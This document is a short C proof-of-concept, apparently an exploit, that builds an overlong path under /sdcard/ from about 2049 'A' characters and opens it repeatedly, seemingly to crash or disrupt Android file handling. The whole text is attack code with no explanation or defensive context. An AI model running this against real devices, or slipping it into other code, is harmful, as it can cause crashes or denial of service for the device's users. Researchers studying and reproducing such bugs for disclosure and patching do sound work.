##### PoC #####
 
#include <stdio.h>
 
int main(int argc, char** argv) {
  char buf[5000];
  int j,k;
  FILE *fp;
  /* Path to sdcard, typically /sdcard/ */
  strcpy(buf,"/sdcard/");
  for(k=0;k<=2048;k++){
    strcat(buf,"A");
  };
  for(j=0;j<=50;j++){
    fp=fopen(buf,"w");
  };
return 0;
}
